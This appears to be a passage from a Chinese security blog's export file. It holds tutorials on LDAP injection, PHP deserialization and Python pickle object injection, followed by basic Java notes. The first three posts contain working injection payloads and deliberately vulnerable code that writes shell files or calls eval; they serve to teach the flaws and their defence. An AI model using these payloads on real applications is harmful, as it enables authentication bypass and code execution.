(&amp;(username=admin)(&amp;))(password=123)) LDAP服务器只会处理第一个过滤器，而第一个过滤器永真，因此绕过了登录框 OR LDAP注入 当后端代码如下：1(|(parameter1=value1)(parameter2=value2)) 一个典型的OR LDAP注入的场景就是：假设一个资源管理器允许用户了解系统中可用的资源(打印机、扫描器、存储系统等)。用于展示可用资源的查询为：1(|(type=Rsc1)(type=Rsc2)) Rsc1和Rsc2表示系统中不同种类的资源，例如，Rsc1=printer，Rsc2=scanner用于列出系统中所以可用的打印机和扫描器。12payload: Rsc1=printer)(uid=*)result: (|(type=printer)(uid=*))(type=scanner)) LDAP服务器会响应所有的打印机和用户对象 LDAP盲注- LDAP AND盲注 假设一个Web应用想从一个LDAP目录列出所有可用的Epson打印机，错误信息不会返回，应用发送如下的过滤器：1(&amp;(objectclass=printer)(type=Epson*)) 使用这个查询，如果有可用的Epson打印机，其图标就会显示给客户端，否则没有图标出现。如果攻击者进行LDAP盲注入攻击”)(objectClass=))(&amp;(objectClass=void”，Web应用会构造如下查询：1(&amp;(objectclass=*)(objectClass=*))(&amp;(objectClass=void)(type=Epson*)) 仅对第一个过滤器进行处理：1(&amp;(objectclass=*)(objectClass=*)) 结果是，打印机的图标会一定显示出来，因为该查询永远会有结果，过滤器objectClass=*总是返回一个对象。当图标被显示时响应为真，否则为假。例如构造如下的注入：123(&amp;(objectClass=*)(objectClass=users))(&amp;(objectClass=foo)(type=Epson*))(&amp;(objectClass=*)(objectClass=resources))(&amp;(objectClass=foo)(type=Epson*)) 这种代码注入的设置允许攻击者推测可能存在于LDAP目录服务中不同对象类的值。当响应Web页面至少包含一个打印机图标时，对象类的值就是存在的，另一方面而言，如果对象类的值不存在或没有对它的访问，就不会有图标出现。 - LDAP OR盲注 这种情况下，用于推测想要的信息的逻辑是相反的，因为使用的是OR逻辑操作符。接下来使用的是同一个例子，OR环境的注入为：1(|(objectClass=void)(objectClass=void))(&amp;(objectClass=void)(type=Epson*)) 这个LDAP查询没有从LDAP目录服务获得任何对象，打印机的图标也不会显示给客户端(FALSE)。如果在响应的Web页面中有任何图标，则响应为TRUE。故攻击者可以注入下列LDAP过滤器来收集信息：12(|(objectClass=void)(objectClass=users))(&amp;(objectClass=void)(type=Epson*))(|(objectClass=void)(objectClass=resources))(&amp;(objectClass=void)(type=Epson*)) ##0x04 LDAP注入防御 LDAP注入的防御跟SQL注入的防御其实差不多，主要就是要把用户输入的东西过滤好，基本就可以防御了。下图包含了LDAP中用到的特殊字符和需要转义处理的字符： 左边的字符在正常情况下是不会用到的，如果在用户的输入中出现了需要用反斜杠转义处理。而右边的圆括号这些如果不过滤的话就会导致过滤器闭合而生产攻击者需要的filter，这里看到不仅是用反斜杠处理，还将字符变成了相应的ASCII码值，这些符号本不该出现。 这段php防御代码可以记录一下：123456789function ldapspecialchars($string) &#123; $sanitized=array(&apos;\\&apos; =&gt; &apos;\5c&apos;, &apos;*&apos; =&gt; &apos;\2a&apos;, &apos;(&apos; =&gt; &apos;\28&apos;, &apos;)&apos; =&gt; &apos;\29&apos;, &quot;\x00&quot; =&gt; &apos;\00&apos;); return str_replace(array_keys($sanitized),array_values($sanitized),$string);&#125; LDAP服务开启的端口是389，如果发现某个服务器上开启了该端口很可能就是开启了LDAP服务 0x05 参考文献http://www.cnblogs.com/r00tgrok/p/LDAP_INJECTION_AND_PREVENTION.html]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>LDAP注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP反序列化漏洞与防御]]></title>
    <url>%2F2018%2F05%2F30%2FPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%8E%E9%98%B2%E5%BE%A1%2F</url>
    <content type="text"><![CDATA[0x01 概述什么是php反序列化漏洞呢？简单的来说，就是在php反序列化的时候，反序列化的内容是用户可控，那么恶意用户就可以构造特定序列化内容的代码，通过unserialize()函数进行特定的反序列化操作，并且程序的某处存在一些敏感操作是写在类中的，那么就可以通过这段恶意代码，达到执行攻击者想要的操作。在了解php反序列化漏洞之前，需要了解一下php序列化和反序列化的相关知识。 0x02 PHP序列化与反序列化123456789101112&lt;?phpclass Test&#123; public $var = &quot;This is a test&quot;; public function PrintVar()&#123; echo this -&gt; $var; &#125;&#125;$obj = new Test();$obj-&gt;PrintVar();?&gt; 运行后 magic 函数 php面向对象变成中，有一类函数叫做magic function，魔术函数，这些函数是以(双下划线)开头的，他们是一些当依照某些规则实例化类或者调用某些函数的时候会自动调用这些magic函数，这里说一下比较常见的例如construct，destory， sleep，wakeup，toString函数。 __construct() __contstruct()函数被称为构造函数，当实例化类的时候会自动调用该函数 __destruct() __destruct()函数被称为析构函数，当类结束的时候自动调用该函数 __sleep() __sleep()函数是当php进行序列化操作（serialize）的时候自动调用该函数，可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。 __wakeup() __wakeup()函数是当php进行反序列化操作（unserialize）的时候自动调用该函数 __toString() __toString()函数是当对象被当做字符串的时候会自动调用该函数 例如： 运行后结果： 私有成员与被保护成员变量的特殊性当类中的成员变量是私有的或者被保护的，那么会产生一些特殊的情况 运行结果： 我们可以看到，在序列化后得到的序列化代码中，私有成员变量name前加了一个User，被保护变量成员age的前面加了一个，并且明明Username长度为8，但是却显示的是10；同样，明明age的长度为4，但却显示的是6。查阅php手册发现，当成员变量是私有的时候，会在成员变量前面添加类名；当成员变量是被保护的时候，会在被保护成员前面添加一个，并且，所添加的类名或者的左右两边都会有一个null字节，因此，这两个长度都增加了2。 ##0x03 PHP反序列化漏洞 wakeup()或destruct()的利用场景 假设服务器的代码如下：123456789101112131415161718&lt;?php class Test&#123; var $test = &quot;123&quot;; function __wakeup()&#123; $fp = fopen(&quot;test.php&quot;, &apos;w&apos;); fwrite($fp, $this -&gt; test); fclose($fp); &#125;&#125;$test1 = $_GET[&apos;test&apos;];print_r($test1);echo &quot;&lt;br /&gt;&quot;;$seri = unserialize($test1);require &quot;test.php&quot;;?&gt; 我们可以在本地搭建环境，编写exp之后用serialize函数进行序列化，得到payload，如：1O:4:&quot;Test&quot;:1:&#123;s:4:&quot;test&quot;;s:18:&quot;&lt;?php%20phpinfo();?&gt;&quot;;&#125; 其他Magic Function情况 当unserialize的时候不是直接在wakup魔术方法中利用，比如在construct之类的，也是有利用价值的。譬如，当wakup中又调用了别的对象，那么我们就可以进行回溯去找，也许也可以利用到。例如：123456789101112131415161718192021&lt;?php class Test1&#123; function __construct($test)&#123; $fp = fopen(&quot;shell.php&quot;, &quot;w&quot;); fwrite($fp, $test); fclose($fp); &#125;&#125;class Test2&#123; var $test = &quot;123&quot;; function __wakeup()&#123; $obj = new Test1($this -&gt; test); &#125;&#125;$test = $_GET[&apos;test&apos;];unserialize($test);require &quot;shell.php&quot;;?&gt; 普通情况 当危险代码存在类的普通方法中，就不能指望通过“自动调用”来达到目的了。这时可以寻找相同的函数名，把敏感函数和类联系在一起。12345678910111213141516171819202122232425262728&lt;?php class Test1&#123; var $test1; function __construct()&#123; $this-&gt;test1 = new Test2(); &#125; function __destruct()&#123; $this-&gt;test1-&gt;action(); &#125;&#125;class Test2&#123; function action()&#123; echo &quot;Test2&quot;; &#125;&#125;class Test3&#123; var $test3; function action()&#123; eval($this-&gt;test3); &#125;&#125;$test = new Test1();unserialize($_GET[&apos;test&apos;]);?&gt; 这里我们可以利用Test3中的action函数中的eval函数做一些事情。12345678910111213141516class Test1&#123; var $test1; function __construct()&#123; $this-&gt;test1 = new Test3(); &#125; function __destruct()&#123; $this-&gt;test1-&gt;action(); &#125;&#125;class Test3&#123; var $test3 = &quot;phpinfo();&quot;;&#125;echo serialize(new Test1()); 得到 O:5:”Test1”:1:{s:5:”test1”;O:5:”Test3”:1:{s:5:”test3”;s:10:”phpinfo();”;}} ##0x04 参考文献 https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>PHP</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python反序列化之pickle篇]]></title>
    <url>%2F2018%2F05%2F30%2FPython%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bpickle%E7%AF%87%2F</url>
    <content type="text"><![CDATA[0x01 前言前两天在安全客中看了一篇python对象注入的文章，感觉写的很好，就学习一下，在此记录一下。 0x02 Python之pickle在研究python反序列化漏洞之前，我们需要了解本次研究的主体：pickle模块这里主要需要知道4个方法：dump()dumps()load()loads() pickle.dump(obj, file, [protocol])dump()会将对象序列化后写入一个文件中，其中，文件需要有write接口，protocol代表的是协议，当protocol=0的时候表示序列化对象用可表示的ascii码写，当protocol=1的时候代表用二进制表示，那么文件就要用wb模式打开，当protocol=2的时候也是用二进制表示，在python2.3之后的版本可以使用，会更高效一些，默认protocol=0。 pickle.dumps(obj)与dump()不同的是，dumps()只是将序列化对象当作字符串返回 pickle.load(file)load()会读入file的内容，并将其反序列化为对象，file的内容要求是序列化的内容。 pickle.loads(pick_data)loads()会将序列化的字符串反序列化为对象 cPickle与pickle的用法差不多，但是cPickle使用C语言写的，别pickle更高效，现在大部分都会使用cPickle来代替pickle了。 0x03 Python对象注入之pickle什么是对象注入？回想一下之前讲PHP反序列化漏洞的时候的概念，其实差不多，在pickle中，序列化的过程是没有问题的，但是当反序列化的过程中，如果用户的输入被传入unpickling中时，那么就有可能存在对象注入的风险。 举个例子：12345678910111213141516171819202122232425import cPickle as pickleimport os, sysarg = sys.argv[1]class Test(object): def load(self, filenmae=None): with open(filenmae, &apos;rb&apos;) as pick_file: self.doWork = pickle.load(pick_file) self.workDone = self.doWork def final_workout(self, unpickled_data): self.filename = &quot;code.py&quot; self.writeinto = open(self.filename, &quot;w&quot;) self.writeinto.write(unpickled_data) print &quot;Flag = 1&quot; self.writeinto.close() os.system(&quot;python2 &#123;&#125;&quot;.format(str(self.filename)))if __name__ == &apos;__main__&apos;: test = Test() test.load(arg) unpickled_data = test.workDone test.final_workout(unpickled_data) 这段代码中，首先他有一个接受用户输入的功能，并且反序列化了用户的输入，并放入一个叫做code.py脚本中执行，那么我们就可以构造特定的字符串来执行我们想要的功能。 0x04 漏洞利用编写exp.py1234567891011121314151617181920212223242526272829303132333435import cPickle as picklefilename = &quot;pickle_data2.txt&quot;code = &quot;code.txt&quot;class Test(object): def load(self, code): self.code = code self.readin = open(code, &quot;r&quot;) self.readin_data = self.readin.read() self.done = pickle.dumps(self.readin_data) def write_into(self, filename, pickle_data): self.writeinto =open(filename, &quot;w&quot;) self.writeinto.write(pickle_data) print &quot;Writing pickle data into the file...&quot; self.writeinto.close() def read_into(self, filenmae): self.filename = filename self.readinto = open(filename, &quot;r&quot;) self.ret_data = self.readinto.read() print &quot;\n\n&quot; print &quot;Pickle data: \n\n&quot; print self.readin_dataif __name__ == &apos;__main__&apos;: test = Test() test.load(code) pickle_data = test.done test.write_into(filename, pickle_data) test.read_into(filename)]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>反序列化</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java中的接口]]></title>
    <url>%2F2018%2F05%2F30%2FJava%E4%B8%AD%E7%9A%84%E6%8E%A5%E5%8F%A3%2F</url>
    <content type="text"><![CDATA[0x01 接口在Java中，接口表示一种规范，要求实现者必须遵循这个规范，用来约束使用者该怎么做必须要求实现者提供具体的实现方法接口就是一个特殊的抽象类就算不实用abstract关键字，他在编译的时候也会自动在class文件中，在方法名前面加上public abstract 0x02 接口的特点 接口是没有构造器的，接口是不能创建对象 接口当中定义变量，会被当作是全局静态常量String name = “pino”; ====&gt;&gt;&gt; public static final String name = “pino”; 接口中定义的方法，都是公共的抽象方法 接口是可以继承的，并且是多继承，都好分割，但是类不能多继承 接口一般可以称为父类 接口也可以多实现，逗号分隔 实现接口的时候，子类要比接口中的类的方法权限大（一般都是public） 面向接口编程（赋值的时候，可以直接赋值给接口类型，多态的概念） 0x03 接口与抽象类的区别？ 相同： 都是被其他类实现或继承 都不能被实例化 都可以定义抽象方法，定义的抽象方法都必须得要覆盖 不同点： 接口是没有构造器的，抽象类是有的 抽象类可以包含普通方法，但是接口当中只能有抽象方法，不能有普通方法 接口默认的成员变量是public static final变量，抽象类当中是默认权限 接口当中的默认方法是public abstract 方法名 0x04 面向接口编程把实现类赋值给接口类型的变量 为什么使用？多态的好处：屏蔽了不同类之间的差异，从而实现通用编程]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java中的抽象]]></title>
    <url>%2F2018%2F05%2F30%2FJava%E4%B8%AD%E7%9A%84%E6%8A%BD%E8%B1%A1%2F</url>
    <content type="text"><![CDATA[0x01 抽象方法 特点 没有方法体 抽象方法必须定义在抽象类或接口 不能是私有的，不能使用final，不能使用static 子类必须要覆盖此方法 0x02 抽象类抽象类必须得要有子类才行（抽象类一般都当作父类来继承） 抽象类是不能直接创建对象的 抽象类当中可以有抽象方法，也可以有普通方法（普通方法：给子类调用的） 子类没有覆盖抽象方法，把子类也变成抽象类，然后创建一个子孙类，让子孙类去覆盖 抽象类的构造方法不能定义为私有的（抽象方法必须得让子类继承之后，才能实现内部的方法体，因为子类如果继承的话，先去调用父类的构造方法） 抽象类不能使用final来修饰 抽象类不是一个完整的类，需要作为一个父类，子类才能完成对应的功能。抽象类命名时，喜欢在前面添加一个Abstract单词 抽象类与普通类的区别？ 普通类有的（字段，方法，构造器），抽象类都有 抽象类不能创建对象，抽象类可以包含抽象方法，也可以包含普通方法 抽象类必须有子类才有意义]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java当中的包装类、装箱和拆箱]]></title>
    <url>%2F2018%2F05%2F30%2FJava%E5%BD%93%E4%B8%AD%E7%9A%84%E5%8C%85%E8%A3%85%E7%B1%BB%E3%80%81%E8%A3%85%E7%AE%B1%E5%92%8C%E6%8B%86%E7%AE%B1%2F</url>
    <content type="text"><![CDATA[0x01 包装类对基本数据类型进行包装，把基本数据类型包装一个对象，从而获取更加强大的功能 基本数据类型 包装类 byte Byte short Short int Integer（内部覆盖到了toString方法，所以打印出来的不是地址而是具体的值） long Long float Float double Double char Character boolean Boolean 0x02 装箱操作12Integer num1 = new Integer(10); //方法一Integer num2 = Integer.valueOf(10);//方法二 在类中，成员变量一般使用包装类，在方法中一般使用基本数据类型。方法中，基本数据类型存储来栈中，而包装类存储在堆中。 0x03 拆箱操作把包装类转回基本数据类型 12Integer num = new Integer(10); //装箱int num2 = num.intValue(); //拆箱 类似的还有doubleValue()、longValue()等等 0x04 自动装箱与自动拆箱 自动装箱可以直接把一个基本数据类型的值赋值给包装类对象 1Integer num = 20; 自动拆箱可以直接把一个包装类对象赋值给基本数据类型的变量 1int num = Integer.valueOf(10); 0x05 包装类valueOf的缓存设计以Integer为例子，如果数值在-128到127之间（不同的包装类数值不同），会使用缓存机制，直接从之前创建的地方获取，超出这个范围则不实用缓存，直接创建新的地址。]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java中的类加载和初始化问题]]></title>
    <url>%2F2018%2F05%2F30%2FJava%E4%B8%AD%E7%9A%84%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%92%8C%E5%88%9D%E5%A7%8B%E5%8C%96%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[0x01 类加载问题什么时候加载类？ 当第一次使用该类对象的时候，去加载到JVM当中，并且只加载一次，下一次使用，直接从内存当中拿，在加载的时候会执行static 0x02 字段初始化问题 静态字段初始化，是在静态代码块当中执行 非静态字段初始化，是在构造器当中做的初始化 子类构造器会默认调用父类构造器]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java中的代码块]]></title>
    <url>%2F2018%2F05%2F30%2FJava%E4%B8%AD%E7%9A%84%E4%BB%A3%E7%A0%81%E5%9D%97%2F</url>
    <content type="text"><![CDATA[0x01 代码块在类中或方法中，使用{}花括号括起来的代码 分类 局部代码块 直接定义在方法内部中 初始化代码块 直接在类中定义代码块 初始化代码块在运行时还要把它放到构造方法当中 创建一个对象就会调用一次 静态代码块 在初始化代码块前加static，在加载成字节码时就会调用，也就是说在主方法前执行，并且只会执行一次]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java中的多态]]></title>
    <url>%2F2018%2F05%2F30%2FJava%E4%B8%AD%E7%9A%84%E5%A4%9A%E6%80%81%2F</url>
    <content type="text"><![CDATA[0x01 多态一个类对象有各种形态，比如狗是狗类，也是动物类，一个表示当前类，一个表示其父类 0x02 多态的特点 子类对象赋值给父类，运行时，表现的是子类的特征（先去找子类的方法） 字段不存在多态，字段前面是什么类型就调用谁的，在编译的时候已经确定要去调用谁的 怎么理解呢，看下面的代码 运行的时候发现结果是Super，不是说调用子类的特征吗？为什么不是Sub？答案就是刚才说的那样，在编译的时候已经决定了使用字段的类型。 0x03 多态的作用 当把不同子类对象都当作父类来看待，可以屏蔽不通过子类对象之间的差异性，从而达到通用编程的目的 使用多态后，只需要写一个方法就能达到相同的功能 0x04 类的强制类型转换把父类赋值给子类，在概念上与多态相反。]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java中的继承]]></title>
    <url>%2F2018%2F05%2F30%2FJava%E4%B8%AD%E7%9A%84%E7%BB%A7%E6%89%BF%2F</url>
    <content type="text"><![CDATA[0x01 子类可以使用父类的哪些成员 父类的public，子类可以继承 protected也可以继承，不同包也能继承 如果子类与父类在同一个包中，子类可以继承父类的默认成员，但是不能继承不同包中的父类的默认成员 private是不能继承的 父类的构造器，子类也不能继承，因为构造器必须跟当前类名相同 0x02 方法的覆盖子类扩展了父类，就获得了父类的方法和成员，如果父类有些方法不适用于子类，可以重新定义这个方法，叫做方法的覆盖。 覆盖的原则 覆盖的方法必须跟父类当中的方法名相同 返回类型要相同 访问权限不能比父类小 0x03 继承的内存分析在类加载字节码时，会先判断有没有父类，如果有，会先把父类加载成字节码放到内存中，然后再把自己加载到内存中 0x04 this和super的对比 super()和this()构造方法都必须放在第一行 super和this不能同时一起使用 子类的构造方法中默认都有一个super()，尽管没有显示出来。 0x05 隐藏 子类跟父类有相同的变量名，叫做隐藏，子类通过”super.字段”来访问父类的成员 子类跟父类当中有相同的静态方法，称方法的隐藏 本垒字段隐藏：方法参数和本类字段名相同，使用”this.字段”来解决]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java中的this关键字]]></title>
    <url>%2F2018%2F05%2F30%2FJava%E4%B8%AD%E7%9A%84this%E5%85%B3%E9%94%AE%E5%AD%97%2F</url>
    <content type="text"><![CDATA[0x01 This关键字在方法中加入this，代表直接给对象当中的字段赋值。 this是当前正在使用的对象的地址 this的作用： 帮助我们区分成员变量和局部变量的二异性 在同类当中，实例方法的调用，前面其实是有this的，只不过给省略了 可以把this作为返回值返回 可以当作返回值 static和this不能同时使用 构造器的重载互调，this()；此时this代表的是构造器名，必须写到第一行。]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java中的变量划分]]></title>
    <url>%2F2018%2F05%2F30%2FJava%E4%B8%AD%E7%9A%84%E5%8F%98%E9%87%8F%E5%88%92%E5%88%86%2F</url>
    <content type="text"><![CDATA[0x01 变量的划分 成员变量 直接定义在类中的变量 类成员变量：在成员变量前面加static 实例变量：没加static就是实例成员变量注意：在方法中不能定义static 局部变量 定义在方法当中的变量（参数，内部定的变量，代码块）必须要初始化之后使用 0x02 总结 类成员和实例成员的访问 在static方法中，只能调用static成员 非static方法中，可以访问静态成员也可以访问非静态成员 可以通过对象去调用静态成员（本质还是通过类名调用） 变量名称 存放位置 生命周期开始 声明周期结束 内存位置 类变量 字段，使用static 所在字节码加载到JVM 当JVM停止时 方法区 实例变量 字段，不使用static 创建所在类的对象 对象被回收的时候 堆 局部变量 方法参数，代码块，方法区 执行到初始化变量时 所在方法或代码块执行结束 栈]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java基本数据类型与引用数据类型]]></title>
    <url>%2F2018%2F05%2F30%2FJava%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E4%B8%8E%E5%BC%95%E7%94%A8%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[0x01 基本数据类型首先，了解一下基本数据类型有哪些 基本数据类型 备注 byte 8位 short 16位 char 16位 int 32位 float 32位 double 64位 long 64位 boolean 1位，只有true和false 基本数据类型只有一块存储空间，在栈中，存放的是具体的值 基本数据类型属于值传递（传递的是一个具体的值） 0x02 引用数据类型什么是引用数据类型？类接口数据枚举注解也就是说，使用new关键字创建出来的乐境都是引用数据类型 引用数据类型有两块存储空间，一个在栈中，一个在堆中，栈中存放的是堆中的地址。 引用数据类型属于地址传递（传递的是一个地址） 0x03 基本数据类型在堆中的初始化栈桢中的数据必须进行初始化，否则不能使用，但是堆中的数据可以不初始化就使用，因为有默认值。 数据类型 默认值 byte 0 short 0 int 0 long 0 float 0.0f double 0.0d char ‘/u0000’ boolean false String String虽然不是基本数据类型，但是也是有默认值的，是null]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JAVA内存了解一下]]></title>
    <url>%2F2018%2F05%2F30%2FJAVA%E5%86%85%E5%AD%98%E4%BA%86%E8%A7%A3%E4%B8%80%E4%B8%8B%2F</url>
    <content type="text"><![CDATA[0x01 前言要想java安全学的好，内存划分必不可少，对于分析java程序，了解内存的划分和运行机制对于安全研究是必不可少的一项技能，最近学习了一下，写了些笔记，分享一下。 0x02 Java内存划分 成员 作用 方法区 存放所有的class和static变量 栈 每执行一个函数，就创建一个栈桢，并加入栈中（每个函数从调用到执行结束，其实是对应一个栈桢的入栈和出栈） 本地方法区 为native方法服务 堆 被所有线程共享的一块区域，在虚拟机启动时就被创建了，所有的对象实例和数组都是在堆上分配的 程序计数器 当前线程所执行的字节码的行号指示器 0x03 栈例如写一段代码12345678910111213141516public class Person &#123; static void say(String name) &#123; System.out.println(&quot;My name is &quot; + name); &#125; public static void main(String[] args) &#123; String name = &quot;pino&quot;; say(name); &#125;&#125; 以这段代码为例子，当程序运行的时候，首先会运行main函数，那么就会先生成一个main函数的栈桢，然后存放栈中，而栈桢中存放的是成员变量，也就是这里的name属性了，接着，调用了say函数，那么就会相应的生成一个say函数的栈桢。当say函数执行结束后，say的栈桢就会从栈中出栈，然后main函数运行结束，main的栈桢也出栈，最后栈中就空了，整个程序就结束了。 以上就是栈的运行机制了，总结一下就是成员变量放在自己的栈桢中，执行函数时把栈桢入栈，方法执行完毕后，该方法的栈桢出栈。 0x04 堆堆的话，就像之前说的，所有的对象实例和数组都在堆上分配。简单的理解就是所有new创建的对象实例都是在堆上进行分配的，因为数组也是new出来的。 例如如下代码123456789public class Person &#123; public static void main(String[] args) &#123; int ages[] = new int[] &#123;1,2,3&#125;; &#125;&#125; 我这里创建了一个数组，那么具体的过程如下： 程序运行，调用main函数 生成main函数的栈桢，并存放到栈中 main的栈桢有一个成员变量ages int[] ages 是声明一个int类型的数组 new int[]{1,2,3} 是在堆中初始化数组（分配一块空间） 把初始化的地址赋值给ages 栈桢中的ages成员会指向堆中的那块空间 是的你没看错，赋值的是一个地址，不信你看 我把ages打印出来，结果确实是一个类似地址的字符串 那么具体点就是堆中存放这对象实例的地址，以及他的成员的值，比如这里它会存放： 位置0的值是1位置1的值是2位置2的值是3 当然，如果说有很多数组变量，那么内存空间可能会紧张，就会变成垃圾，等着垃圾回收器来回收。 0x05 垃圾回收机制Java是自动垃圾回收机制，不像c语言，需要自己来回收。当JVM发现内存不够时，会自动清理无用对象 JVM的垃圾回收机制中，判断一个对象是否死亡，并不是根据是否还有对象对其引用，而是通过可达性分析。对象之间的引用可以抽象为树形结构，通过树根作为起点，从这些树根往下搜索，搜索走过的链称为引用链，当一个对象到GC ROOTs没有任何引用链相连，则证明这个对象是不可用的，该对象会被判定为可回收的对象。 0x06 总结创建一个对象时，比如Person，方法区存放的是Person对象的字节码（Person.class）以及static等常量。new的时候，堆中分配一块区域，有对象的地址和对象属性的值栈中存放方法的栈桢，该栈桢存放成员变量，其值为实例化的对象的地址]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java序列化与反序列化基础]]></title>
    <url>%2F2018%2F05%2F30%2FJava%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[0x01 概述什么是序列化，简单的来说，序列化就是为了保存对象的状态；而反序列化就是把保存的对象状态再读出来。使用场景： 当想把内存中的对象状态保存到一个文件或者数据库中的时候 当想用套接字在网络上传送对象的时候 当想通过RMI传输对象的时候 0x02 Java支持序列化种类Java支持的序列化有三种 自定义实现Serializable接口的类 Java的基本类型 Java自带的实现了Serializable接口的类 下面用程序展示着三种情况 支持自定义实现Serializable接口的类：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.io.Serializable;public class SerialTest1 &#123; private static final String TMP_FILE = &quot;.serialtest1.txt&quot;; public static void main (String args[]) &#123; testWrite(); testRead(); &#125; private static void testWrite() &#123; try &#123; ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(TMP_FILE)); Box box = new Box(&quot;desk&quot;, 80, 48); out.writeObject(box); System.out.println(&quot;testWrite box:&quot; + box); out.close(); &#125;catch (Exception ex) &#123; ex.printStackTrace(); &#125; &#125; private static void testRead() &#123; try &#123; ObjectInputStream in = new ObjectInputStream(new FileInputStream(TMP_FILE)); Box box = (Box)in.readObject(); System.out.println(&quot;testRead box:&quot; + box); in.close(); &#125;catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125;class Box implements Serializable &#123; private int width; private int height; private String name; public Box (String name, int width, int height) &#123; this.name = name; this.height = height; this.width = width; &#125; public String toString () &#123; return &quot;[&quot; + name + &quot;: (&quot; + width + &quot;, &quot; + height + &quot;) ]&quot;; &#125;&#125; 运行结果： 支持java的基本类型和自带的实现了Serializable接口的类123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.Serializable; import java.util.Map;import java.util.HashMap;import java.util.Iterator; public class SerialTest2 &#123; private static final String TMP_FILE = &quot;.serialabletest2.txt&quot;; public static void main(String[] args) &#123; testWrite(); testRead(); &#125; private static void testWrite() &#123; try &#123; ObjectOutputStream out = new ObjectOutputStream( new FileOutputStream(TMP_FILE)); out.writeBoolean(true); out.writeByte((byte)65); out.writeChar(&apos;a&apos;); out.writeInt(20131015); out.writeFloat(3.14F); out.writeDouble(1.414D); HashMap map = new HashMap(); map.put(&quot;one&quot;, &quot;red&quot;); map.put(&quot;two&quot;, &quot;green&quot;); map.put(&quot;three&quot;, &quot;blue&quot;); out.writeObject(map); out.close(); &#125; catch (Exception ex) &#123; ex.printStackTrace(); &#125; &#125; private static void testRead() &#123; try &#123; ObjectInputStream in = new ObjectInputStream( new FileInputStream(TMP_FILE)); System.out.printf(&quot;boolean:%b\n&quot; , in.readBoolean()); System.out.printf(&quot;byte:%d\n&quot; , (in.readByte()&amp;0xff)); System.out.printf(&quot;char:%c\n&quot; , in.readChar()); System.out.printf(&quot;int:%d\n&quot; , in.readInt()); System.out.printf(&quot;float:%f\n&quot; , in.readFloat()); System.out.printf(&quot;double:%f\n&quot; , in.readDouble()); HashMap map = (HashMap) in.readObject(); Iterator iter = map.entrySet().iterator(); while (iter.hasNext()) &#123; Map.Entry entry = (Map.Entry)iter.next(); System.out.printf(&quot;%-6s -- %s\n&quot; , entry.getKey(), entry.getValue()); &#125; in.close(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 运行结果 这里HashMap是java.util包中定义的类，它属于java自带的实现Serializable接口的类，它的接口声明如下：12public class HashMap&lt;K,V&gt; extends AbstractMap&lt;K,V&gt; implements Map&lt;K,V&gt;, Cloneable, Serializable &#123;&#125; 0x03 序列化中的特例从上面说得，我们知道序列化/反序列化，只支持保存/恢复对象状态，即仅支持保存/恢复类的成员变量，但不支持保存类的成员方法，但是，序列化是不是对类的所有的成员变量的状态都能保存呢？答案是否定的。 